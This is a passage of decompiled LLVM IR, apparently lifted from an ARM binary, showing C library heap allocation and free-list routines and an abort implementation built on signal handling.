dec_label_pc_16804:                               ; preds = %bb11
  %v1_1680c = call i32 @__pthread_return_0()
  %v1_16814 = call i32 @__GI_sbrk(i32 0)
  %v0_16818 = load i32, i32* @r4, align 4
  %v1_16818 = add i32 %v0_16818, 12
  store i32 %v1_16818, i32* @r5, align 4
  %v9_1681c = icmp eq i32 %v1_16818, %v1_16814
  br i1 %v9_1681c, label %dec_label_pc_16840, label %dec_label_pc_16824

dec_label_pc_16824:                               ; preds = %dec_label_pc_16804
  %v1_16830 = call i32 @__pthread_return_0()
  br label %dec_label_pc_16838

dec_label_pc_16838:                               ; preds = %bb11, %dec_label_pc_16824, %bb14
  %v2_16838 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16838, i32* @r4, align 4
  store i32 %v6_167b8, i32* @r5, align 4
  store i32 %v9_167b8, i32* %r6.global-to-local, align 4
  store i32 %v15_167b8, i32* %r8.global-to-local, align 4
  %v0_1683c = call i32 @__pthread_return_0()
  %v0_16840.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16840

dec_label_pc_16840:                               ; preds = %dec_label_pc_16804, %dec_label_pc_16838
  %v1_16848 = phi i32 [ %v0_16818, %dec_label_pc_16804 ], [ %v0_16840.pre, %dec_label_pc_16838 ]
  %v1_16840 = add i32 %v1_16848, 4
  %v2_16840 = inttoptr i32 %v1_16840 to i32*
  %v3_16840 = load i32, i32* %v2_16840, align 4
  %v2_16844 = icmp eq i32 %v3_16840, 0
  br i1 %v2_16844, label %.thread, label %bb12

bb12:                                             ; preds = %dec_label_pc_16840
  %v2_16848 = add i32 %v1_16848, 8
  %v3_16848 = inttoptr i32 %v2_16848 to i32*
  %v4_16848 = load i32, i32* %v3_16848, align 4
  %v3_1684c = add i32 %v3_16840, 8
  %v4_1684c = inttoptr i32 %v3_1684c to i32*
  store i32 %v4_16848, i32* %v4_1684c, align 4
  %v0_16850.pre = load i32, i32* @r4, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_16840, %bb12
  %v0_16850 = phi i32 [ %v1_16848, %dec_label_pc_16840 ], [ %v0_16850.pre, %bb12 ]
  %v1_16850 = add i32 %v0_16850, 8
  %v2_16850 = inttoptr i32 %v1_16850 to i32*
  %v3_16850 = load i32, i32* %v2_16850, align 4
  %v1_16854 = add i32 %v0_16850, 4
  %v2_16854 = inttoptr i32 %v1_16854 to i32*
  %v3_16854 = load i32, i32* %v2_16854, align 4
  %v2_16858 = icmp eq i32 %v3_16850, 0
  br i1 %v2_16858, label %.thread1, label %bb13

bb13:                                             ; preds = %.thread
  %v3_1685c = add i32 %v3_16850, 4
  %v4_1685c = inttoptr i32 %v3_1685c to i32*
  store i32 %v3_16854, i32* %v4_1685c, align 4
  br label %bb14

.thread1:                                         ; preds = %.thread
  %v2_16860 = load i32, i32* %r8.global-to-local, align 4
  %v3_16860 = inttoptr i32 %v2_16860 to i32*
  store i32 %v3_16854, i32* %v3_16860, align 4
  br label %bb14

bb14:                                             ; preds = %bb13, %.thread1
  %v1_16870 = call i32 @__pthread_return_0()
  %v0_16874 = load i32, i32* %r6.global-to-local, align 4
  %v1_16874 = load i32, i32* @r4, align 4
  %v0_1687c = load i32, i32* @r5, align 4
  %v2_16874 = sub i32 12, %v0_16874
  %v1_16878 = add i32 %v2_16874, %v1_16874
  %v2_1687c = sub i32 %v1_16878, %v0_1687c
  %v1_16880 = call i32 @__GI_sbrk(i32 %v2_1687c)
  br label %dec_label_pc_16838

; uselistorder directives
  uselistorder i32 %v0_16850, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_sbrk, { 2, 1, 0 }
  uselistorder i32** @global_var_28a10.989, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_16840, { 1, 0 }
  uselistorder label %dec_label_pc_16838, { 2, 1, 0 }
}

define i32 @__heap_alloc(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_168a4 = inttoptr i32 %arg2 to i32*
  %v2_168a4 = load i32, i32* %v1_168a4, align 4
  %v3_168a8 = load i32, i32* @r4, align 4
  store i32 %v3_168a8, i32* %stack_var_-8, align 4
  %v1_168ac = add i32 %v2_168a4, 3
  %v1_168b0 = and i32 %v1_168ac, -4
  store i32 %v1_168b0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_168b8 = icmp ugt i32 %v1_168b0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_168c0 = load i32, i32* %arg1, align 4
  store i32 %v2_168c0, i32* %r0.global-to-local, align 4
  br i1 %v2_168b8, label %dec_label_pc_1692c.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1692c.preheader

dec_label_pc_1692c.preheader:                     ; preds = %entry, %bb
  %v1_168e0 = phi i32 [ %v1_168b0, %entry ], [ 12, %bb ]
  %v2_1692c9 = icmp eq i32 %v2_168c0, 0
  br i1 %v2_1692c9, label %dec_label_pc_16934, label %dec_label_pc_168cc

dec_label_pc_168cc:                               ; preds = %dec_label_pc_1692c.preheader, %dec_label_pc_16928
  %v2_168e4 = phi i32 [ %v3_16928, %dec_label_pc_16928 ], [ %v2_168c0, %dec_label_pc_1692c.preheader ]
  %v1_168cc = inttoptr i32 %v2_168e4 to i32*
  %v2_168cc = load i32, i32* %v1_168cc, align 4
  store i32 %v2_168cc, i32* @ip, align 4
  %v3_168d0 = icmp ult i32 %v2_168cc, %v1_168e0
  br i1 %v3_168d0, label %dec_label_pc_16928, label %dec_label_pc_168d8

dec_label_pc_168d8:                               ; preds = %dec_label_pc_168cc
  %v1_168d8 = add i32 %v1_168e0, 44
  %v3_168dc = icmp ult i32 %v2_168cc, %v1_168d8
  br i1 %v3_168dc, label %dec_label_pc_168ec, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_168d8
  %v2_168d0.le = sub i32 %v2_168cc, %v1_168e0
  store i32 %v2_168d0.le, i32* %v1_168cc, align 4
  %v0_16918.pre = load i32, i32* @ip, align 4
  %v0_16920.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_168ec:                               ; preds = %dec_label_pc_168d8
  %v1_168ec = add i32 %v2_168e4, 4
  %v2_168ec = inttoptr i32 %v1_168ec to i32*
  %v3_168ec = load i32, i32* %v2_168ec, align 4
  store i32 %v3_168ec, i32* %r2.global-to-local, align 4
  %v2_168f0 = icmp eq i32 %v3_168ec, 0
  br i1 %v2_168f0, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_168ec
  %v2_168f4 = add i32 %v2_168e4, 8
  %v3_168f4 = inttoptr i32 %v2_168f4 to i32*
  %v4_168f4 = load i32, i32* %v3_168f4, align 4
  %v3_168f8 = add i32 %v3_168ec, 8
  %v4_168f8 = inttoptr i32 %v3_168f8 to i32*
  store i32 %v4_168f4, i32* %v4_168f8, align 4
  %v0_168fc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_168ec, %bb27
  %v0_168fc = phi i32 [ %v2_168e4, %dec_label_pc_168ec ], [ %v0_168fc.pre, %bb27 ]
  %v1_168fc = add i32 %v0_168fc, 8
  %v2_168fc = inttoptr i32 %v1_168fc to i32*
  %v3_168fc = load i32, i32* %v2_168fc, align 4
  %v1_16900 = add i32 %v0_168fc, 4
  %v2_16900 = inttoptr i32 %v1_16900 to i32*
  %v3_16900 = load i32, i32* %v2_16900, align 4
  %v2_16904 = icmp eq i32 %v3_168fc, 0
  br i1 %v2_16904, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_16908 = add i32 %v3_168fc, 4
  %v4_16908 = inttoptr i32 %v3_16908 to i32*
  store i32 %v3_16900, i32* %v4_16908, align 4
  %v1_16910 = load i32, i32* @ip, align 4
  store i32 %v1_16910, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1690c = load i32, i32* %r1.global-to-local, align 4
  %v3_1690c = inttoptr i32 %v2_1690c to i32*
  store i32 %v3_16900, i32* %v3_1690c, align 4
  %v1_16914.pre = load i32, i32* @ip, align 4
  store i32 %v1_16914.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_16920 = phi i32 [ %v0_16920.pre, %.thread._crit_edge ], [ %v1_16910, %bb28 ], [ %v1_16914.pre, %.thread5 ]
  %v0_16918 = phi i32 [ %v0_16918.pre, %.thread._crit_edge ], [ %v1_16910, %bb28 ], [ %v1_16914.pre, %.thread5 ]
  %v1_16918 = load i32, i32* %r0.global-to-local, align 4
  %v2_16918 = sub i32 %v1_16918, %v0_16918
  %v1_1691c = add i32 %v2_16918, 12
  store i32 %v1_1691c, i32* %r0.global-to-local, align 4
  %v1_16920 = load i32, i32* %r4.global-to-local, align 4
  %v2_16920 = inttoptr i32 %v1_16920 to i32*
  store i32 %v0_16920, i32* %v2_16920, align 4
  %v2_16924 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16924, i32* %r4.global-to-local, align 4
  ret i32 %v1_1691c

dec_label_pc_16928:                               ; preds = %dec_label_pc_168cc
  %v1_16928 = add i32 %v2_168e4, 4
  %v2_16928 = inttoptr i32 %v1_16928 to i32*
  %v3_16928 = load i32, i32* %v2_16928, align 4
  store i32 %v3_16928, i32* %r0.global-to-local, align 4
  %v2_1692c = icmp eq i32 %v3_16928, 0
  br i1 %v2_1692c, label %dec_label_pc_1692c.dec_label_pc_16934_crit_edge, label %dec_label_pc_168cc

dec_label_pc_1692c.dec_label_pc_16934_crit_edge:  ; preds = %dec_label_pc_16928
  br label %dec_label_pc_16934

dec_label_pc_16934:                               ; preds = %dec_label_pc_1692c.dec_label_pc_16934_crit_edge, %dec_label_pc_1692c.preheader
  store i32 %v3_168a8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_16928, { 1, 2, 0 }
  uselistorder i32 %v0_168fc, { 1, 0 }
  uselistorder i32 %v2_168cc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_168e4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_168e0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_168cc, { 1, 0 }
  uselistorder label %dec_label_pc_1692c.preheader, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_16938 = load i32, i32* @r2, align 4
  %v2_16938 = icmp eq i32 %v0_16938, 0
  %v0_1693c = load i32, i32* @r3, align 4
  %v1_1693c = load i32, i32* @r1, align 4
  %v2_1693c = add i32 %v1_1693c, 4
  %v3_1693c = inttoptr i32 %v2_1693c to i32*
  store i32 %v0_1693c, i32* %v3_1693c, align 4
  %v0_16940 = load i32, i32* @r2, align 4
  %v1_16940 = load i32, i32* @r1, align 4
  %v2_16940 = add i32 %v1_16940, 8
  %v3_16940 = inttoptr i32 %v2_16940 to i32*
  store i32 %v0_16940, i32* %v3_16940, align 4
  %v1_16948 = load i32, i32* @r1, align 4
  br i1 %v2_16938, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_16944 = load i32, i32* @r2, align 4
  %v3_16944 = add i32 %v2_16944, 4
  %v4_16944 = inttoptr i32 %v3_16944 to i32*
  store i32 %v1_16948, i32* %v4_16944, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_16948 = load i32, i32* @r0, align 4
  %v3_16948 = inttoptr i32 %v2_16948 to i32*
  store i32 %v1_16948, i32* %v3_16948, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_1694c = load i32, i32* @r3, align 4
  %v2_1694c = icmp eq i32 %v0_1694c, 0
  br i1 %v2_1694c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_16950 = load i32, i32* @r1, align 4
  %v3_16950 = add i32 %v0_1694c, 8
  %v4_16950 = inttoptr i32 %v3_16950 to i32*
  store i32 %v1_16950, i32* %v4_16950, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_16954 = load i32, i32* @r0, align 4
  ret i32 %v1_16954

; uselistorder directives
  uselistorder i32 %v1_16948, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_16958 = load i32, i32* @r2, align 4
  %v2_16958 = icmp eq i32 %v0_16958, 0
  %v1_1695c = load i32, i32* @r1, align 4
  br i1 %v2_16958, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1695c = load i32, i32* @r0, align 4
  %v3_1695c = inttoptr i32 %v2_1695c to i32*
  store i32 %v1_1695c, i32* %v3_1695c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_16960 = add i32 %v0_16958, 4
  %v4_16960 = inttoptr i32 %v3_16960 to i32*
  store i32 %v1_1695c, i32* %v4_16960, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_16964 = load i32, i32* @r2, align 4
  %v1_16964 = load i32, i32* @r1, align 4
  %v2_16964 = add i32 %v1_16964, 8
  %v3_16964 = inttoptr i32 %v2_16964 to i32*
  store i32 %v0_16964, i32* %v3_16964, align 4
  %v1_16968 = load i32, i32* @r0, align 4
  ret i32 %v1_16968

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1696c = load i32, i32* @r4, align 4
  store i32 %v3_1696c, i32* %stack_var_-20, align 4
  %v2_16970 = load i32, i32* %arg1, align 4
  store i32 %v2_16970, i32* %r4.global-to-local, align 4
  %v2_16974 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_169902 = icmp eq i32 %v2_16970, 0
  br i1 %v2_169902, label %dec_label_pc_16a40, label %dec_label_pc_16980

dec_label_pc_16980:                               ; preds = %entry, %dec_label_pc_16988
  %v0_169d0 = phi i32 [ %v0_169d8, %dec_label_pc_16988 ], [ 0, %entry ]
  %v0_169d8 = phi i32 [ %v3_1698c, %dec_label_pc_16988 ], [ %v2_16970, %entry ]
  %v1_169945.in = phi i32 [ %v3_1698c, %dec_label_pc_16988 ], [ %v2_16970, %entry ]
  %v1_169945 = add i32 %v1_169945.in, 12
  %v3_16980 = icmp ult i32 %v1_169945, %arg2
  br i1 %v3_16980, label %dec_label_pc_16988, label %dec_label_pc_169a0

dec_label_pc_16988:                               ; preds = %dec_label_pc_16980
  store i32 %v0_169d8, i32* %r6.global-to-local, align 4
  %v1_1698c = add i32 %v0_169d8, 4
  %v2_1698c = inttoptr i32 %v1_1698c to i32*
  %v3_1698c = load i32, i32* %v2_1698c, align 4
  store i32 %v3_1698c, i32* %r4.global-to-local, align 4
  %v2_16990 = icmp eq i32 %v3_1698c, 0
  br i1 %v2_16990, label %dec_label_pc_16990.dec_label_pc_16a40.loopexit_crit_edge, label %dec_label_pc_16980

dec_label_pc_169a0:                               ; preds = %dec_label_pc_16980
  %v1_169a0 = inttoptr i32 %v0_169d8 to i32*
  %v2_169a0 = load i32, i32* %v1_169a0, align 4
  store i32 %v2_169a0, i32* @ip, align 4
  %v2_169a4 = sub i32 %v0_169d8, %v2_169a0
  %v1_169a8 = add i32 %v2_169a4, 12
  %v3_169ac = icmp uge i32 %v1_169a8, %v2_16974
  %v9_169ac = icmp eq i32 %v1_169a8, %v2_16974
  %v2_169b0 = xor i1 %v9_169ac, true
  %v3_169b0 = and i1 %v3_169ac, %v2_169b0
  br i1 %v3_169b0, label %dec_label_pc_16a40, label %dec_label_pc_169b4

dec_label_pc_169b4:                               ; preds = %dec_label_pc_169a0
  %v2_169b4 = add i32 %v2_169a0, %arg3
  store i32 %v2_169b4, i32* %r7.global-to-local, align 4
  br i1 %v9_169ac, label %dec_label_pc_169bc, label %dec_label_pc_169e8

dec_label_pc_169bc:                               ; preds = %dec_label_pc_169b4
  %v2_169bc = icmp eq i32 %v0_169d0, 0
  br i1 %v2_169bc, label %dec_label_pc_16a34, label %dec_label_pc_169c4

dec_label_pc_169c4:                               ; preds = %dec_label_pc_169bc
  %v1_169c4 = add i32 %v0_169d0, 12
  %v9_169c8 = icmp eq i32 %v1_169c4, %arg2
  br i1 %v9_169c8, label %dec_label_pc_169d0, label %dec_label_pc_16a34

dec_label_pc_169d0:                               ; preds = %dec_label_pc_169c4
  %v1_169d0 = inttoptr i32 %v0_169d0 to i32*
  %v2_169d0 = load i32, i32* %v1_169d0, align 4
  %v1_169d4 = add i32 %v0_169d0, 8
  %v2_169d4 = inttoptr i32 %v1_169d4 to i32*
  %v3_169d4 = load i32, i32* %v2_169d4, align 4
  store i32 %v3_169d4, i32* @r2, align 4
  store i32 %v0_169d8, i32* @r1, align 4
  %v2_169dc = add i32 %v2_169d0, %v2_169b4
  store i32 %v2_169dc, i32* %r7.global-to-local, align 4
  %v0_169e0 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_16a34

dec_label_pc_169e8:                               ; preds = %dec_label_pc_169b4
  %v1_169e8 = add i32 %v0_169d8, 4
  %v2_169e8 = inttoptr i32 %v1_169e8 to i32*
  %v3_169e8 = load i32, i32* %v2_169e8, align 4
  store i32 %v3_169e8, i32* %r5.global-to-local, align 4
  %v2_169ec = icmp eq i32 %v3_169e8, 0
  br i1 %v2_169ec, label %dec_label_pc_16a20, label %dec_label_pc_169f4

dec_label_pc_169f4:                               ; preds = %dec_label_pc_169e8
  %v1_169f4 = inttoptr i32 %v3_169e8 to i32*
  %v2_169f4 = load i32, i32* %v1_169f4, align 4
  store i32 %v2_169f4, i32* @ip, align 4
  %v2_169f8 = sub i32 %v3_169e8, %v2_169f4
  %v1_169fc = add i32 %v2_169f8, 12
  %v9_16a00 = icmp eq i32 %v2_16974, %v1_169fc
  br i1 %v9_16a00, label %dec_label_pc_16a08, label %dec_label_pc_16a20

dec_label_pc_16a08:                               ; preds = %dec_label_pc_169f4
  store i32 %v0_169d0, i32* @r2, align 4
  store i32 %v3_169e8, i32* @r1, align 4
  %v2_16a10 = add i32 %v2_169f4, %v2_169b4
  store i32 %v2_16a10, i32* %r7.global-to-local, align 4
  %v0_16a14 = call i32 @__heap_link_free_area_after()
  %v0_16a18 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a18, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_16a34

dec_label_pc_16a20:                               ; preds = %dec_label_pc_169f4, %dec_label_pc_169e8
  %v2_16a20 = add i32 %v0_169d8, %arg3
  store i32 %v2_16a20, i32* %r4.global-to-local, align 4
  store i32 %v3_169e8, i32* @r3, align 4
  store i32 %v0_169d0, i32* @r2, align 4
  store i32 %v2_16a20, i32* @r1, align 4
  %v0_16a30 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16a34

dec_label_pc_16a34:                               ; preds = %dec_label_pc_169c4, %dec_label_pc_169bc, %dec_label_pc_16a08, %dec_label_pc_169d0, %dec_label_pc_16a20
  %v0_16a34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a34, i32* %r5.global-to-local, align 4
  %v0_16a38 = load i32, i32* %r7.global-to-local, align 4
  %v2_16a38 = inttoptr i32 %v0_16a34 to i32*
  store i32 %v0_16a38, i32* %v2_16a38, align 4
  br label %dec_label_pc_16a58

dec_label_pc_16990.dec_label_pc_16a40.loopexit_crit_edge: ; preds = %dec_label_pc_16988
  br label %dec_label_pc_16a40

dec_label_pc_16a40:                               ; preds = %entry, %dec_label_pc_16990.dec_label_pc_16a40.loopexit_crit_edge, %dec_label_pc_169a0
  %v1_16a40 = add i32 %v2_16974, -12
  store i32 %v1_16a40, i32* %r5.global-to-local, align 4
  %v3_16a44 = inttoptr i32 %v1_16a40 to i32*
  store i32 %arg3, i32* %v3_16a44, align 4
  %v0_16a48 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16a48, i32* @r3, align 4
  %v0_16a4c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_16a4c, i32* @r2, align 4
  %v0_16a50 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_16a50, i32* @r1, align 4
  %v0_16a54 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_16a58

dec_label_pc_16a58:                               ; preds = %dec_label_pc_16a34, %dec_label_pc_16a40
  %v0_16a58 = load i32, i32* %r5.global-to-local, align 4
  %v2_16a5c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_16a5c, i32* @r4, align 4
  ret i32 %v0_16a58

; uselistorder directives
  uselistorder i32 %v3_169e8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_169ac, { 1, 0 }
  uselistorder i32 %v3_1698c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_169d8, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_169d0, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a58, { 1, 0 }
  uselistorder label %dec_label_pc_16a40, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16a34, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_16980, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_16a7c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_16a60 = ptrtoint i32* %stack_var_-268 to i32
  %v1_16a70 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_16a7c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_16a7c

dec_label_pc_16a7c:                               ; preds = %dec_label_pc_16a7c.lr.ph, %dec_label_pc_16a7c
  %v1_16a80 = phi i32 [ 31, %dec_label_pc_16a7c.lr.ph ], [ %v1_16a8c, %dec_label_pc_16a7c ]
  %v4_16a80 = mul i32 %v1_16a80, 4
  %v5_16a80 = add i32 %v4_16a80, %v2_16a7c
  %v2_16a88 = add i32 %v5_16a80, -128
  %v3_16a88 = inttoptr i32 %v2_16a88 to i32*
  store i32 0, i32* %v3_16a88, align 4
  %v0_16a8c = load i32, i32* %r1.global-to-local, align 4
  %v1_16a8c = add i32 %v0_16a8c, -1
  store i32 %v1_16a8c, i32* %r1.global-to-local, align 4
  %v6_16a8c = icmp slt i32 %v1_16a8c, 0
  br i1 %v6_16a8c, label %dec_label_pc_16a94, label %dec_label_pc_16a7c

dec_label_pc_16a94:                               ; preds = %dec_label_pc_16a7c
  %v2_16a94 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_16a94, i32* @r4, align 4
  store i32 %v2_16a94, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_16aa0 = call i32 @__sigaddset()
  %v2_16aa4 = icmp eq i32 %v0_16aa0, 0
  br i1 %v2_16aa4, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16a94
  store i32 %v2_16a94, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16a94, %bb
  store i32 92856, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_16aa4, i32 ptrtoint (i32* @global_var_14350.1006 to i32))
  %v2_16abc = load i32, i32* @global_var_2ee74.1008, align 4
  %v2_16ac0 = icmp eq i32 %v2_16abc, 0
  br i1 %v2_16ac0, label %dec_label_pc_16ac8, label %dec_label_pc_16af8

dec_label_pc_16ac8:                               ; preds = %.thread1
  store i32 1, i32* @global_var_2ee74.1008, align 4
  br label %dec_label_pc_16ad0

dec_label_pc_16ad0:                               ; preds = %dec_label_pc_16b48, %dec_label_pc_16ac8
  store i32 92896, i32* @lr, align 4
  %v1_16adc = call i32 @__pthread_return_0()
  %v1_16ae4 = call i32 @__raise(i32 6)
  store i32 92920, i32* @lr, align 4
  %v1_16af4 = call i32 @__pthread_return_0()
  %v2_16afc.pre = load i32, i32* @global_var_2ee74.1008, align 4
  br label %dec_label_pc_16af8

dec_label_pc_16af8:                               ; preds = %.thread1, %dec_label_pc_16ad0
  %v0_16b6c = phi i32 [ %v2_16abc, %.thread1 ], [ %v2_16afc.pre, %dec_label_pc_16ad0 ]
  store i32 ptrtoint (i32* @global_var_2ee74.1008 to i32), i32* %ip.global-to-local, align 4
  %v7_16b00 = icmp eq i32 %v0_16b6c, 1
  br i1 %v7_16b00, label %dec_label_pc_16b30.lr.ph, label %dec_label_pc_16b64

dec_label_pc_16b30.lr.ph:                         ; preds = %dec_label_pc_16af8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_2ee74.1008, align 4
  %v2_16b1c = bitcast i32* %stack_var_-268 to i8*
  %v3_16b1c = call i32 @__GI_memset(i8* %v2_16b1c, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b30

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b30.lr.ph, %dec_label_pc_16b30
  %v1_16b34 = phi i32 [ 31, %dec_label_pc_16b30.lr.ph ], [ %v1_16b40, %dec_label_pc_16b30 ]
  %v4_16b34 = mul i32 %v1_16b34, 4
  %v5_16b34 = add i32 %v4_16b34, %v2_16a7c
  %v2_16b3c = add i32 %v5_16b34, -264
  %v3_16b3c = inttoptr i32 %v2_16b3c to i32*
  store i32 -1, i32* %v3_16b3c, align 4
  %v0_16b40 = load i32, i32* %r1.global-to-local, align 4
  %v1_16b40 = add i32 %v0_16b40, -1
  store i32 %v1_16b40, i32* %r1.global-to-local, align 4
  %v6_16b40 = icmp slt i32 %v1_16b40, 0
  br i1 %v6_16b40, label %dec_label_pc_16b48, label %dec_label_pc_16b30

dec_label_pc_16b48:                               ; preds = %dec_label_pc_16b30
  store i32 %v2_16a60, i32* %r1.global-to-local, align 4
  %v4_16b5c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_16ad0

dec_label_pc_16b64:                               ; preds = %dec_label_pc_16af8
  %v7_16b64 = icmp eq i32 %v0_16b6c, 2
  br i1 %v7_16b64, label %dec_label_pc_16b6c, label %dec_label_pc_16b78

dec_label_pc_16b6c:                               ; preds = %dec_label_pc_16b64
  store i32 3, i32* @global_var_2ee74.1008, align 4
  %v0_16b74 = call i32 @abort()
  %v2_16b78.pre = load i32, i32* @global_var_2ee74.1008, align 4
  br label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b64, %dec_label_pc_16b6c
  %v1_16b80 = phi i32 [ %v0_16b6c, %dec_label_pc_16b64 ], [ %v2_16b78.pre, %dec_label_pc_16b6c ]
  %v7_16b7c = icmp eq i32 %v1_16b80, 3
  br i1 %v7_16b7c, label %bb27, label %.thread3

bb27:                                             ; preds = %dec_label_pc_16b78
  %v2_16b88 = load i32, i32* %ip.global-to-local, align 4
  %v3_16b88 = inttoptr i32 %v2_16b88 to i32*
  store i32 4, i32* %v3_16b88, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_16b78, %bb27
  call void @__pseudo_cond_branch(i1 %v7_16b7c, i32 ptrtoint (i32* @global_var_13fd4.1010 to i32))
  br label %dec_label_pc_16b90

dec_label_pc_16b90:                               ; preds = %dec_label_pc_16b90, %.thread3
  %v0_16b90 = call i32 @abort()
  br label %dec_label_pc_16b90

; uselistorder directives
  uselistorder i32 %v1_16b40, { 2, 1, 0 }
  uselistorder i32 %v1_16a8c, { 2, 1, 0 }
  uselistorder i32* %stack_var_-268, { 1, 2, 0, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 7, 0, 1, 8, 4, 6, 5, 2 }
  uselistorder i32 140, { 1, 0 }
  uselistorder i32* @global_var_2ee74.1008, { 1, 2, 0, 6, 3, 4, 5 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16b78, { 1, 0 }
  uselistorder label %dec_label_pc_16b30, { 1, 0 }
